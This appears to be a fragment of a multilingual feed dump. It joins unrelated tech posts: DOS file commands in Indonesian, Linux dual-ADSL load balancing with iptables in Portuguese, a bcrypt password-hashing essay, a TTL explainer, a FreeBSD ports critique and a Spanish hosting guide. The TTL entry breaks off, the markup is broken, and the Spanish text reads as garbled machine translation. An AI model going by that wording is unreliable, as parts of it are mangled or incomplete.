gunakan kutip 2 ") Contoh1:   Copy C:\Document1.txt D:\Document1.txt Contoh2:   Copy "C:\Documet 1 Komputer.txt" "D:\Document 1 Komputer.txt"  Intruksi Menghapus "FILE" Del [nama file]        (Jika Nama File terdapat Spasi Gunakan Kutip 2 ") Contoh1: Del D:\Document1.txt Contoh2: Del "D:\Document 1 Komputer.txt"  Intruksi Menghapus "FOLDER" RD [nama folder]   (Jika Nama Folder Terdapat Spasi Gunakan Kutip 2 ") Contoh1: RD D:\DOKUMEN Contoh2: RD "D:\DOKUMEN TUGAS"  Intruksi Me Rename Folder / File Ren [Nama Asal] [Nama Jadi] ( Jika Nama Terdapat Spasi Gunakan Kutip 2 ") Contoh1: Ren Doc1.txt Doc12.text Contoh2: Ren "Document Komputer.txt" "Document Tugas Komputer.doc"  Intruksi Membuat Folder md [nama folder1] [nama folder2] [namafolder3] [namafolder4] [namafolder5] [dan seterusnya tetap dipisah spasi]  (Jika nama terdapat spasi gunakan Kutip 2 ") Contoh1: md 1 2 3 4 5 6 7 8 9 0 11 12 13 14 15 16 17 dst Contoh2: md "Folder 1" "Folder 2" "Folder 3" "dan Folder Seterusnya"   POSTING INI TIDAK COPY PASTE - 100% ASLI]]></summary>

  <summary><![CDATA[O texto original pode ser encontrado em http://www.linux-es.org.br/artigos/bolinho00.html

  
Introdução:
  

Com o barateamento de links de acesso a internet e o aparecimento da conexão de banda-larga a um valor acessível, muitas empresas e edifícios residenciais começaram a utilizar soluções para prover acesso à internet através de pequenos servidores (routers) que fazem a comunicação entre a rede do cliente e a internet. Nesse momento surgiu a idéia de juntar duas conexões com a internet de modo que um unico canal de saída fosse visto fazendo com que a velocidade da conexão fosse duplicada, consequentemente barateando o custo de uma conexão de por exemplo 1Mbps, que sai pelo valor de 2 conexões ADSL de 512Kbps. 
Para por em prática a idéia de se utilizar o balancemento de conexão com a internet e até mesmo o serviço de redundância a falhas contra queda de conexão, foi elaborado este “mini HOW-TO” que demonstra de forma simples e clara como esse tipo de configuração pode ser feita. Dando assim o chute inicial para que outros scripts com mais funcionalidades e mais complexos possam ser criados. 
Requisitos: 
Alguns requisitos são vitais para o funcionamento deste tipo de configuração tais como os ja descritos no título do artigo: 


Iptables




Iproute2





Scripts de inicialização das conexões (caso seja velox, ou serviço parecido)



Cenário: 
O cenário utilizado para a demonstração do exemplo é um edifício residencial no qual existem duas conexões com a internet através de assinaturas de acesso a banda-larga (Velox). Os dois modems ADSL estão configurados como ROTEADORES e existe um servidor linux (distribuição a escolha) com 3 placas de rede que estão configuradas da seguinte maneira: 
	eth0: Rede interna (Rede do edifício) - (192.168.0.1/255.255.255.0)
	eth1: Conexão Velox #1                - (192.168.1.2/255.255.255.0)
	eth2: Conexão Velox #2                - (192.168.2.2/255.255.255.0)
  
 
O dispositivo de rede eth0 está ligado a um switch aonde as demais máquinas dos apartamentos estão conectadas. 
OBS: Neste cenário devemos ressaltar que todos os computadores da rede interna do edifício poderão se comunicar por estarem ligadas diretamente ao segmento da rede. 
 
Configurações: 
Primeiro Passo: Inicializando as conexões. 
Neste ponto começarei a mostrar os scripts utilizados para a configuração do servidor. Vou começar mostrando algumas configurações que foram feitas dentro do /etc/rc.local, que acabaram sendo de grande ajuda para que o serviço funcionasse corretamente. 
	# ---- /etc/rc.local ----
	#!/bin/sh
	#
	# This script will be executed *after* all the other init scripts.
	# You can put your own initialization stuff in here if you don't
	# want to do the full Sys V style init stuff.

	touch /var/lock/subsys/local

	echo "Inicializando conexao com a internet.."
	/sbin/ifdown eth1
	/sbin/ifdown eth2

	echo "Iniclizando VELOX #1"
	/sbin/ifup eth1
	/sbin/route add default gw 192.168.1.1
	/etc/firewall/ip-velox.pl

	echo "Inicializando VELOX #2"
	/sbin/ifup eth2
	/sbin/route del default gw 192.168.1.1
	/sbin/route add default gw 192.168.2.1
	/etc/firewall/ip-velox.pl

	/sbin/route del default gw 192.168.2.1

	echo "Configurando o firewall"
	/etc/firewall/firewall.sh
	# ----/etc/rc.local ----
  
Essas configurações foram feitas para que o velox pudesse conectar-se automaticamente usando o script ip-velox.pl (Desenvolvido pelo Fabio Vilan, e pode ser encontrado em http://www.isec.com.br/velox). 
OBS: Não sei informar se este script ainda consegue conectar-se ao velox. O legal dele é a parte de teste de conexão (testa se está ativa ou não). 
As configurações das rotas foram necessarias para que cada velox pudesse conectar e autenticar-se pois o problema que geralmente acontece quando se tem duas conexões no mesmo computador é que, quando a primeira conexão é estabelecida a rota padrão é automaticamente definida, assim a segunda conexão fica perdida, tentando enviar pacotes que usam a rota padrão, neste caso pela primeira que já está estabelecida. Assim não conseguiamos autenticar a segunda conexão do velox. 
Lendo-se o script é possível identificar os passos para o estabelecimento das conexões: 


Derruba as duas conexões (uma de cada velox);




Levanta a placa do primeiro velox (Velox #1);




Adiciona uma rota padrão para esta placa que foi inicializada;




Tenta se conectar e autenticar utilizando o script ip-velox.pl;




Levanta a placa do segundo velox (Velox #2);
Deleta a rota padrão criada para o primeiro velox (Velox #1);




Adiciona a rota padrão para o segundo velox (Velox #2);




Utiliza o script de conexão e autenticação para o segundo velox (Velox #2);




Deleta a rota padrão criada para o segundo velox (Velox #2);




Levanta o firewall.


OBS: Este script termina por não estabelecer uma rota padrão, pois estas configurações serão feitas dentro do script /etc/firewall/firewall.sh que é chamado pelo rc.local ao final do processo de autenticação. 
Segundo Passo: Criando tabelas de conexões para roteamento. 
Quando o iproute2 está instalado é criado um arquivo dentro do diretório /etc/iproute2 (ou /etc), chamado rt_tables. O arquivo onde as tabelas (de regras) de roteamento são definidas. 
Cada tabela é definida por seu número identificador e nome. A ordenação vai de 0 à 255 (256 valores = 8 bits) e a faixa de 253 à 255 é reservada às tabelas do sistema (local, main e default). 
O kernel trabalha exclusivamente com o identificador numerico da tabela. Assim podemos estabelecer novas tabelas e definir situações especiais de roteamento. 
Exemplo de arquivo (/etc/iproute2/rt_tables) utilizado para a configuração do balanceamento de links de acordo com o cenário proposto. 
	# ---- /etc/iproute2/rt_tables ---- 
	#
	# reserved values
	#
	#255	local
	#254	main
	#253	default
	#0	unspec

	#
	# local
	#
	#1	inr.ruhep
	10	velox1
	11	velox2
	30	velox
	# ---- /etc/iproute2/rt_tables ----
  
Neste exemplo foram criadas 3 tabelas que serão utilizadas para a criação das regras de roteamento avançadas, necessárias para o funcionamento do balanceamento de links. 
As tabelas cridas no arquivo rt_tables foram: 
	Valor		Nome
	10		velox1
	11		velox2
	30		velox
  
De acordo com o arquivo, uma tabela tem “ID” 10, outra tem “ID” 11 e outra tabela, com valor mais acima tem “ID” 30. A criação dessas tabelas foram necessárias, pois são utilizadas no momento em que serão criadas as regras de roteamento. 
Para maiores explicações sobre rt_tables, e roteamento avançado, procure pelos documentos da RNP (GTER), http://eng.registro.br/gter17/videos/05-roteamento-avancado-linux.pdf, em sites de busca (google) www.google.com.br, tambem vale a pena dar uma olhada no how-to do iproute2, além disso existe uma empresa chamada Alto Rio Preto Informatica, que disponibilizou um excelente “case” em seu site: http://www.altoriopreto.com.br/case1_tech2.php 
Terceiro Passo: Desenvolvendo o script do firewall e criando o roteamento. 
O script /etc/firewall/firewall.sh (que é chamado pelo /etc/rc.local) contém não apenas configurações do firewall, mas também regras de NAT e ajustes nas tabelas de roteamento para que seja feito o balanceamento. Para os casos das configurações das tabelas de roteamento usaremos o comando “ip” e para o firewall e as regras de nat o “iptables”. Este firewall foi escrito com base na documentação do firewall de exemplo do Márcio Oliveira (marcio@netkraft.com.br), que provê acesso à internet para uma rede interna através do squid (porém neste exemplo não o usamos). 
Ao longo do script existirão comentários sobre as regras que o script está executando, mantendo assim uma linha lógica de configuração e simplificando a identificação de comandos.

O script ainda libera o acesso para que o nosso serviço de DHCP rodando neste mesmo servidor possa fornecer o pool de endereços IP para os apartamentos do edifício exemplo do nosso cenário. 
No final do script, ou seja, na parte onde são feitas as configurações para o funcionamento do balanceamento dos links, é importante a observação que faz referencia ao comando de balanceamento que deve ser digitado em somente uma linha, não apertando a tecla [Enter] (ou usando o caractere para dividí-la): 
	Regra: ip route add default table velox nexthop via 192.168.1.1 dev eth1 
		weight 1 nexthop via 192.168.2.1 dev eth2 weight 1
  
Outra importante consideração sobre o script é a utilização da marcação de pacotes para que os mesmos fossem roteados pelas duas conexões ADSL. Primeiramente foi criada uma regra para o firewall, através do iptables, dizendo para marcar todos os pacotes com destino de saída da rede. 
	Regra: iptables -A PREROUTING -t mangle -s 192.168.0.0/24 -d 0/0 -j MARK --set-mark 3
  
Em segundo lugar foi utilizada essa marcação nos pacotes para servir de entrada como uma “Classificação” para a tabela de roteamento (30 Velox). 
	Regra: ip rule add fwmark 3 lookup velox prio 3
  
Outro detalhe importante é a configuração da primeira rota padrão, as conexões, mesmo estando balanceadas, neste caso de 1:1 (soma dos links) precisam de ter uma rota padrão, pois esta será por onde o balanceamento deverá ser iniciado, ou seja, a primeira conexão que chegar ao servidor, será transmitida para a internet pela rota padrão, a próxima conexão que for solicitada, será transmitida pelo outro link (balanceamento de 1:1, uma conexão para cada link). 
Assim um exemplo seria, o download de um arquivo de 200MBs, se fosse iniciado o download deste arquivo a partir de um gerenciador de downloads,e utilizando-se opções que permitam a divisão do download em outras conexões, seria possível por exemplo “baixar” 100mbs a partir de cada conexão, levando-se em consideração que foi escolhida a opção de dividir o download em duas partes. 
Em números: Se o download através de uma conexão está sendo feito a 20kbps, dividindo este download, e utilizando o balanceamento para usar a conexão do outro modem ADSL, é possível que o download possa ser feito ao dobro da velocidade, como no exemplo, 40kbps. 
Além do balanceamento este script já provê redundância de conexões, ou seja se uma conexão cair ele automaticamente redireciona todo o tráfego para a conexão que continuou ativa. 
Recomenda-se o uso de alguma ferramenta que possa monitorar as conexões, uma excelente alternativa é o IpTraf: http://cebu.mozcom.com/riker/iptraf/download.html 
Com ele será possível ver as conex�es ativas dos usuários, a velocidade real das conexões ADSL e ver o balanceamento em funcionamento. 
Quarto Passo: Simples configuração de um servidor DHCP. 
Este é um exemplo de configuração do servidor DHCP no Linux utilizando o serviço DHCPD, através do arquivo de configuração dhcpd.conf, localizado dentro do diretório /etc. 
Não entrarei em detalhes sobre a sua configuração, as informações nele configuradas mostram a ativação deste serviço para uma rede 192.168.0.0/24 (ou seja, máscara de rede 255.255.255.0 com faixa de ips entre 192.168.0.0 até 192.168.0.255). Os endereços por ele distribuidos estão na faixa de .10 a .250, e algumas outras opções muito importantes também não poderiam deixar de ser setadas, como a rota padrão e os servidores de DNS. 
	# ---- /etc/dhcpd.conf ----
	default-lease-time 43200;
	max-lease-time 43200;
	option domain-name "minharede.intranet";
	option domain-name-servers 200.X.X.X, 200.X.X.X;
	ddns-update-style ad-hoc;
	subnet 192.168.0.0 netmask 255.255.255.0 {
        		range 192.168.0.10      192.168.0.250;
        		option routers          192.168.0.1;
        		option subnet-mask      255.255.255.0; 

		allow unknown-clients; 
	}
	# ---- /etc/dhcpd.conf  ----
  
Para maiores informações sobre o serviço DHCP, é aconselhavel o uso do “man”, pois existem muitas informações e parâmetros de configurações contidas nele. 
Considerações Finais: 
Este script está em funcionamento extamente do jeito que foi postado aqui. 
É claro que milhares de outras configurações podem ser feitas e utilizadas com o balanceamento de links, como por exemplo a divisão de utilização de links por portas, ou aplicações, mas este Não é o objetivo deste pequeno artigo que se resume a demonstrar de forma simplificada o balanceamento de conexões.]]></summary>

  <title><![CDATA[Password Hashing: Best Practice]]></title>
  <summary><![CDATA[Last week I read a post on
Brian Krebs’ blog where security researcher Thomas Ptacek was interviewed about
his thoughts on the current landscape of password hashing. I found Thomas’ insights
into this topic quite pertinent and would like to reiterate his sentiments
by talking a little about the importance of choosing the right password hashing scheme. 




The idea of storing
passwords in a “secret” form (as opposed to plain-text) is no new notion. In
1976 the Unix operating system would store password hash representations using
the crypt one-way cryptographic hashing function.  As one can imagine, the processing power back
then was significantly less than that of current day standards. With crypt only
being able to hash fewer than 4 passwords per second on 1976 hardware, the
designers of the Unix operating system decided there was no need to protect the
password file as any attack would, by
enlarge, be computationally infeasible. Whilst this assertion was certainly
true in 1976, an important oversight was made when implementing this design
decision: Moore’s Law. 




Moore’s Law states that computing power will
double approximately every two years. To date, this notion has held true since
it was first coined by Gordon Moore in 1965. Because of this law, we find that
password hashing functions (such as crypt) do not withstand the test of time as
they have no way of compensating for the continual increase in computing power.
The problem we find with cryptographic hashing functions is that whilst
computing power continually increases over time, password entropy (or
randomness) does not. 




If we fast-forward to the
current day environment we see that not much has changed since the early
implementations of password hashing.  One-way
cryptographic hashing functions are still in widespread use today, with SHA-1,
SHA-256, SHA-512, MD5 and MD4 all commonly used algorithms. Like crypt on the
old Unix platform, these functions have no way of compensating for an increase
in computing power and therefore will become increasingly vulnerable to
password-guessing attacks in the future. 




Fortunately, this problem
was solved in 1999 by two researches working on the OpenBSD Project, Niels
Provos and David Mazieres. In their paper, entitled ‘A Furture-Adaptable Password Scheme’, Provos and Mazieres describe a cost-adaptable algorithm that adjusts
to hardware improvements and preservers password security well into the future. 




Based on Bruce Shneier’s
blowfish algorithm, EksBlowfish (or expensive key scheduling blowfish), is a
cost-parameterizable and salted block cipher which takes a user-chosen password
and key and can resist attacks on those keys. This algorithm was implemented in a
password hashing scheme called bcrypt.



Provos and Mazieres
identified that in order for their bcrypt password scheme to be hardened
against password guessing, it would need the following design criteria:



Finding
partial information about the password is as hard as guessing the password itself.
This is accomplished by using a random salt.
The
algorithm should guarantee collision resistance.
Password should not be hashed by a single
function with a fixed computational cost, but rather by of a family of functions
with arbitrarily high cost.


The first two points here
are fairly standard among password hashing algorithms. The last point, however,
is somewhat of a different concept to what we are used to seeing. 




If we think about cryptographic hashing functions
in use today - be it MD5, SHA-1, or MD4 - we notice they all have one thing in
common: speed. Each of these algorithms is incredibly quick at computing its
respective output. As hardware gets better, so too does the speed at which
these algorithms can operate. Whilst this may potentially be seen as a positive
thing where usability is concerned, it is certainly an undesirable trait from a
security standpoint. The quicker these algorithms are able to compute their
output, the less time it takes for the passwords to be cracked. 




Provos and Mazieres were
able to solve this problem by deliberately designing bcrypt to be computationally
expensive. In addition, they introduced a tunable cost parameter which is able
to increase the algorithm’s completion time by a factor of 2 each time it is
incremented(effectively doubling the time it takes to compute the result). This
means that bcrypt can be tuned (i.e. incremented every 2 years) to keep up with
Moore’s Law. 




Let’s have a quick look at
how bcrypt compares against other hashing algorithms. Let’s say we have a list of
1000 salted SHA-1 hashes that we wish to crack. Because they are salted, we can’t
use a pre-computed list of hashes against this list. We can, however, crack the
hashes one by one. Let’s say on modern hardware it takes a microsecond
(000000.1 seconds) to make a guess at the password. This means that per second we
could generate 1 million password guesses per hash. 




In contrast, say we have the
same list but instead of SHA-1 the hashes have been derived using bcrypt. If
the hashes were say computed with a cost of 12, we are able to compute a
password guess roughly every 500 milliseconds. That is, we can only guess 2
passwords a second. Now if you think we have 1000 password hashes, we can only
generate 7,200 guesses per hour. As it would be more efficient targeting all
1000 hashes (as opposed to just one), we would be limited to approximately 7
guesses per hash. 




Below is the output of a
quick program I created to display the time it takes to compute a bcrypt
comparison as the cost value is incremented. The test was conducted on a RHEL
system running a Xeon X5670 @ 2.9Ghz with 1024MB of memory. 








 
The source code for this program can be found here.



The bcrypt password hashing
scheme is currently available in many languages including Java, C#,
Objective-C, perl, python, and Javascript among others. 




I hope this post highlights the importance of using stronger password hashing schemes for modern day applications.]]></summary>

  <title><![CDATA[Apa itu Time to Live (TTL)? Pengertian dan Penjelasan TTL]]></title>
  <summary><![CDATA[Bagi kalian anak jaringan pasti sudah tidak asing lagi dengan yang namanya Time to Live (TTL) kan? Pastinya kalian sering sekali melakukan ping saat mengkonfigurasi jaringan dan output yang muncul pada ping tersebut salah satunya berupa TTL. Namun saya yakin banyak dari kalian yang masih belum mengerti apa maksud dari TTL itu. Maka dari itu berikut akan saya bahas tentang Apa itu Time to Live (TTL)? Pengertian dan Penjelasan TTL. 
 

Time to Live (TTL) adalah mekanisme yang membatasi umur data dalam komputer atau jaringan. TTL dapat diimplementasikan sebagai counter atau timestamp terpasang atau tertanam dalam data. Setelah hitungan peristiwa atau jangka waktu yang telah berlalu, data akan dibuang. Dalam jaringan komputer, TTL mencegah paket data dari beredar terun menerus (tanpa batas). Dalam aplikasi komputasi, TTL digunakan untuk meningkatkan kinerja caching atau meningkatkan privasi. 

TTL adalah nilai waktu termasuk dalam paket yang dikirim melalui TCP / IP berbasis jaringan yang memberitahu penerima berapa lama waktu untuk terus atau menggunakan paket atau data yang dimasukkan sebelum waktunya habis dan membuang paket atau data. 
Time-to-Live (TTL) telah diubah namanya  pada IP versi 6. Dalam hal ini disebut hop limit dan memiliki fungsi yang sama seperti pada TTL di IPv4. 
Nilai dari TTL akan muncul pada beberapa utilitas jaringan seperti Ping, traceroute, dan utilitas jaringan PathPing  untuk mencoba untuk mencapai komputer host yang diberikan atau untuk melacak rute ke host tersebut. 
Default Windows 95/98 nilai TTL adalah 32 hop. Berkut ini adalah daftar Perangkat / Sistem operasi dengan nilai-nilai default TTL :

  <title><![CDATA[FreeBSD Ports Annoyance]]></title>
  <summary><![CDATA[Ivan Voras’ article on FreeBSD’s pkgng prompted me to try pkgng. pkgng works exactly as advertised, with a couple of minor annoyances. But this brought to head a problem with FreeBSD that I’ve had for a while. I’ve talked to various ports guys about it over the years. It’s an engineering problem that’s begging for someone to solve. 
Before folks in other Unix-like operating systems start snickering at “Lucas turning like a rabid dog on the community he came from”: you guys have your own problems. Go deal with them. 
First, some context: 
When the Ports Tree started it was pretty durn good. It might have started life as a temporary workaround, but it came out all right. Ports was the envy of many operating systems, and it got dragged into other BSDs and copied elsewhere. And in many ways, it’s actually aged pretty well. I run all three “Big BSDs” and a DragonFly box. I administer CentOS and Ubuntu machines. I have a couple of OpenSolaris servers slated to be replaced with FreeNAS. I feel qualified to offer an opinion on how things compare. FreeBSD trumpets its performance as a network operating system, as well it should. It passes packets like “whoa.” It makes lots of complicated stuff easy.  
But some simple tasks are harder than they should be. 
I’m standing up a new server to replace my old Web server. The old server originally ran 6-current, and has been updated to -current every few months. Now and then, Apache hangs up. I’m fairly confident that some lingering cruft from a previous aeon is responsible, and while I could exhaustively search the old server for the problem, I’d rather send it off to a well-deserved retirement and put some new hardware in play. 
So, I have a virgin server. I want sendmail, mutt, and a WordPress server. (Your choices might differ, and that’s fine.) I don’t care which Web server WordPress runs on, anything vaguely modern would do. I’d like to install all software from packages, as I don’t have the time or energy to build an artisan server. Ideally, I won’t even need to install the Ports Collection. This is an extremely common set of software. 
I can do this easily on OpenBSD, because OpenBSD has One True Web Server. It’s Apache 1.3, yes, which makes my bowels churn a bit, but the OpenBSD Project stands behind it, so: fine. I can do this with CentOS or Ubuntu or OpenSolaris — I have to install new repositories, which brings up all kinds of trust issues, but when you run those operating systems you decide to evaluate those risks on an ongoing basis. Fine. (I must confess, I’ve never installed a Web server on my NetBSD palmtop. That’s too geeky even for me.) 
But I just can’t do this with FreeBSD. 
The Ports System is massively flexible. If I’m willing to build from source, I can configure my system in dang near any way I like. That’s an awesome feature. It really is. The Apache 2.2 port has about eighty configuration knobs. I can tweak them all. I can build Apache exactly as I want and be highly confident that it will Just Work. 
This is amazing. 
But I can’t install a WordPress server with precompiled packages. 
The problem is in the PHP port. PHP doesn’t know which Web server you’re running. The Ports System gives you the flexibility to build PHP with or without the Apache module. You can build with or without every dang module in the world. The PHP port doesn’t tie your hands. 
But without these — comparatively tiny — bits of precompiled glue, I can’t make FreeBSD Just Work. 
And it’s not just WordPress. I run an LDAP server at work. Apache 2.2 can be compiled to include the OpenLDAP module. But I cannot install this common corporate configuration from packages, I must compile the software myself. If I want OpenLDAP and Postgres, well, that’s a different build. And if an application absolutely requires MySQL, it’s back to the Ports Tree. 
Multiply this by the thousands of combinations of options in over 23,000 ports, and… wow. Building a package for every possible combination would take a long time. 
I can — and do — build my own package repositories. But this is an ongoing annoyance. And if I need an Apache 2.2 server that supports OpenLDAP, MySQL, and Postgres, I’m back to building it myself. 
The Ports System makes the difficult manageable. I’d much rather maintain my own FreeBSD package repo than a CentOS or Ubuntu/Debian repo. But I really shouldn’t have to. 
I’m not saying “copy Linux.” By all that’s sacred, no. NO. But they’ve solved this problem without building umpteen bajillion packages. We have some really brilliant people in the community. Surely there’s a realistic solution to this? 
I pimp BAMP (BSD, Apache, Mysql, PHP) as an alternative to LAMP. This particular example of this issue stops those efforts cold. 
Just in case you’re one of the brilliant people in our community, and this motivates you to do something, as a sysadmin who wants to run a lot more FreeBSD, here’s what I’d like to see: 
Don’t rely on external package repositories. Every time I need to add a new repository to make some Linux package work, my blood turns to icewater and the voices in the back of my head start gibbering again. FreeBSD has a centralized model. I trust FreeBSD’s central package builds; they’re highly consistent, and if they get compromised, I will hear about it.
I’d like to be able to set variables in, say, /etc/make.conf or /usr/local/etc/pkg.conf that say what combination of software I use. Say, WEBSERVER=apache22 and DATABASE=postgres91. There are ports that will configure the ports-building process for me, such as ports-mgmt/portconf; I’d like something similar for packages.
When I install a new server, I want to be able to copy the config file in, run pkg add wordpress, and have the package system say “Aha! The Boss wants to run this webserver, and this database, but the software package doesn’t support his chosen database, so I’ll install MySQL anyway.” It should then just Do The Right Thing.
Why don’t I fix this? I’m a sysadmin, not a programmer. Hogs, when they look at my code, vomit. My spare time is spent writing, most often in support of the various BSD communities. I could learn to fix it, but I believe that others are better qualified to do it first. But those most likely to be able to fix it are also those most likely to just build the software themselves. 
We run operating systems to use applications. (If that wasn’t true, I would have truly mastered my Sinclair ZX80 by now.) The new user, confronted with a requirement to install the Ports Tree to build a simple PHP webserver, might well say “ick” and install something else instead. It’s a serious barrier to entry. 
So, if you’re looking for a new problem to solve, here it is.]]></summary>

  <title><![CDATA[Elegir un Hosting]]></title>
  <summary><![CDATA[¿Cuáles son algunas de las cosas que usted debe buscar al elegir un proveedor de alojamiento web? Los criterios para la elección de un proveedor de alojamiento web gratuito y una solución de alojamiento web comercial son ligeramente diferentes a pesar de que se superponen. Si usted está interesado sólo en uno de estos tipos, basta con saltar a la sección correspondiente. He escrito estas secciones a ser tan independiente del otro como sea posible. 
La elección de un alojamiento web profesional
La fiabilidad y la velocidad de acceso
No sólo si el proveedor de alojamiento web fiable y rápido, se debe garantizar su tiempo de actividad (el momento en que es funcional). Busque un tiempo de actividad mínima del 99%. De hecho, incluso el 99% es en realidad muy bajo – en realidad debería ser del 99,5% o superior. El anfitrión debe proporcionar algún tipo de devolución (reembolso prorrateado por ejemplo, o descuento) si cae por debajo de esa cifra. Nótese, sin embargo que las garantías son a menudo difíciles de hacer cumplir de su fin – sobre todo si el anfitrión niega había ningún tiempo de inactividad. Sin embargo, sin esa garantía, la red de acogida tendrán pocos incentivos para asegurarse de que sus servidores están corriendo todo el tiempo. 
Transferencia de datos (tráfico / ancho de banda)
La transferencia de datos (a veces vagamente conocido como “tráfico” o “ancho de banda”) es la cantidad de bytes transferidos desde su sitio a los visitantes cuando navegan por su sitio. 
No creo que cualquier servidor web comercial que anuncia “ancho de banda ilimitado”. El anfitrión tiene que pagar por el ancho de banda, y si usted consume una gran cantidad de él, no en silencio se hará cargo de sus gastos. Muchos sitios web de gran ancho de banda han encontrado esta de la manera difícil cuando de repente recibe una factura exorbitante por haber “superado” el “ancho de banda ilimitado”. Siempre busque información sobre la cantidad de tráfico del paquete permite. Yo personalmente siempre mantenerse alejados de cualquier host que se anuncia la “transferencia ilimitada”, aunque la cantidad exacta que se especifica en otro lugar (a veces enterrados en sus declaraciones de política). Por lo general, usted encontrará que redefinir la “ilimitada”, que se limita de alguna manera. 
Además, mientras que el ancho de banda siempre es algo que usted debe comprobar siempre, no ser excesivamente influido por las promesas de cantidades muy grandes de ancho de banda. Lo más probable es que su sitio web nunca será capaz de utilizar esa cantidad, porque llegará a otros límites, a saber, los límites de los recursos. Para más detalles, vea el artículo de la letra pequeña de Web Hosting: Límites de Uso de recursos. 
Para que os hagáis una idea aproximada de los requisitos de tráfico típicos de un sitio web, los sitios más nuevos que no son archivos de software o proporcionar el vídeo o la música en su uso del sitio a menos de 3 GB de ancho de banda por mes. Sus requerimientos de tráfico crecerá con el tiempo, ya que su sitio se vuelve más conocido (y muy buenas conexiones), lo que tendrá que revisar también su política en caso de sobrepasar su límite de transferencia de datos: hay un cargo por GB publicó más de lo permitido ancho de banda? Es la acusación de acuerdo al uso real o se espera que usted pagar por adelantado un excedente potencial? No es mejor ir a los anfitriones que esperan pagar por adelantado por exceso, ya que es muy difícil de preveer que su sitio será superior a su ancho de banda y mucho más por la forma. 
Espacio en disco
Por la misma razón que el ancho de banda, también mirar hacia fuera para los “sin límite de espacio en disco” esquemas. Muchos de los sitios nuevos (que no alojan vídeos o música) tienen menos de 20 MB de espacio web, así que incluso si se le proporciona un host que te tienta con 100 GB (o “espacio ilimitado”), tenga en cuenta que son poco proclive a utilizar ese espacio, así que no deje el espacio de 100 GB es demasiado grande un factor en su cuenta cuando se comparan con los anfitriones web. La empresa de alojamiento también es consciente de que, por lo que se sienten libres para ofrecerle que, como medio de atraer a alojar allí. 
Soporte técnico
¿Tiene su función de apoyo técnico las 24 horas al día, 7 días a la semana (a menudo abreviado 24/7), durante todo el año? Tenga en cuenta que no voy a aceptar una serie que no tiene el personal que trabaja los fines de semana o días festivos. Usted se sorprenderá de cuántas veces las cosas van mal en el más incómodo de los tiempos. Dicho sea de paso, sólo porque una gran cantidad anuncia que tiene soporte 24/7 no significa necesariamente que realmente tiene ese tipo de apoyo. Pruebe a cabo por correo electrónico a la medianoche y en las noches de sábado, domingos por la mañana, etc Echa un vistazo a el tiempo que tardan en responder. Además de la velocidad de las respuestas, revise para ver si son técnicamente competentes. Usted no quiere firmar para arriba para un host que está dirigido por un grupo de vendedores que sólo saben vender y arreglar no es un problema. 
FTP, PHP, Perl, SSI,. Htaccess, Telnet, SSH, MySQL, crontabs. 
Si usted está pagando por un sitio, usted realmente debe asegurarse de que tiene todo esto. 
Tenga en cuenta que algunos servidores comerciales no permitirá la instalación de PHP o scripts de Perl sin su aprobación. Esto no es deseable ya que significa que usted tiene que esperar a que antes de poder implementar una característica en su sitio. “. htaccess” es necesario si va a hacer cosas como personalizar las páginas de error (las páginas que muestran cuando, por ejemplo, un usuario solicita una página para la que no existe en su sitio) o para proteger su sitio de diversas maneras (por ejemplo, a la prevenir el robo de ancho de banda y hotlinking, etc.) 
El acceso de Telnet o SSH es útil para ciertas cosas, incluidas las secuencias de comandos de prueba ciertos programas), bases de datos MySQL que mantienen, etc. Es necesaria si se desea ejecutar un blog o un sistema de gestión de contenidos. Cron es un tipo de programa de planificación que le permite ejecutar programas en determinados momentos del día (por ejemplo, una vez al día). Revise para ver si estas instalaciones se proporcionan. 
SSL (servidor seguro), la cesta de compra
Si usted está planeando en hacer cualquier tipo de negocio a través de su sitio web, es posible que desee a mirar hacia fuera para ver si el anfitrión ofrece estas instalaciones. Estas instalaciones implican normalmente un paquete de mayor precio o cargos adicionales. Lo más importante es comprobar para ver si están disponibles en todos antes de comprometerse con el host. Sin duda alguna necesitará SSL si desea cobrar los pagos de tarjetas de crédito en su sitio. 
Correo electrónico, Autorespondedores, POP3, reenvío de correo
Si usted tiene su propio sitio, probablemente querría tener direcciones de correo electrónico en su propio dominio, al igual que sales@yourdomain.com, etc ¿El anfitrión debe aportar esto con el paquete? ¿Se le permite tener un catch-all cuenta de correo electrónico que hace que cualquier dirección de correo electrónico de tu dominio para ser enviado a usted? ¿Se puede establecer una dirección de correo electrónico para responder de forma automática al remitente con un mensaje predefinido (llamado un autoresponder)? ¿Se puede recuperar el correo con el software de correo electrónico? ¿Puede ser automáticamente enviado a su dirección de correo electrónico actual? 
Panel de control
Esto se conoce por varios nombres diferentes equipos, pero en esencia, todos ellos le permiten gestionar los diferentes aspectos de su cuenta de web usted mismo. Por lo general, y en lo más mínimo, le debería permitir hacer cosas como añadir, eliminar y administrar sus direcciones de correo electrónico, y cambiar las contraseñas de su cuenta. Yo no iría a un host donde tengo que ir a través de su apoyo técnico cada vez que quiero cambiar una contraseña o añadir / eliminar una cuenta de correo electrónico. Estas tareas son las tareas comunes de mantenimiento que cada webmaster realiza una y otra vez, y sería una gran molestia si usted tuvo que esperar por su apoyo técnico para hacer los cambios para usted. 
Alojar múltiples dominios y subdominios
Para aquellos que estén pensando en vender espacio web o tener varios dominios o subdominios alojados en su cuenta, usted debe buscar para ver si ofrecen esto, y la cantidad adicional que se cobra por este (si se trata de una sola vez o cargo mensual , etc.) 
Servidor
Es el tipo de sistema operativo y el servidor es importante? Si lo crees o no en el plano teórico, hay algunas razones prácticas para mirar hacia fuera para el tipo de servidor. 
En general, si desea utilizar cosas como escribir / usar programas de ASP, no tienes más remedio que buscar un servidor de Windows. 
De lo contrario mi preferencia es para registrarse en las cuentas que utilizan los sistemas Unix suele ser más barato, más estables y cargado de características de funcionamiento del servidor Apache. De hecho, si las páginas generadas dinámicamente que pueden acceder a bases de datos (etc) es lo que quieres, siempre puedes utilizar el más portable (y popular) de PHP en lugar de engancharte hasta ASP. Otra razón para preferir basados ​​en Unix anfitriones de la tela (que incluyen servidores web que utilizan sistemas como Linux, FreeBSD, OpenBSD, Solaris, etc) utilizando el servidor web Apache es que estos servidores permiten configurar una gran cantidad de instalaciones que normalmente se necesita en su sitio (las páginas de error, la protección de sus imágenes, el bloqueo de las cosechadoras de correo electrónico, bloqueo de direcciones IP, etc) sin tener que preguntar a su proveedor de alojamiento web para ponerlas en práctica. El conocimiento sobre la configuración de servidores Apache también está ampliamente disponible, y se puede encontrar en Apache thesitewizard.com ‘s Configuración y. Htaccess páginas también. 
Precio
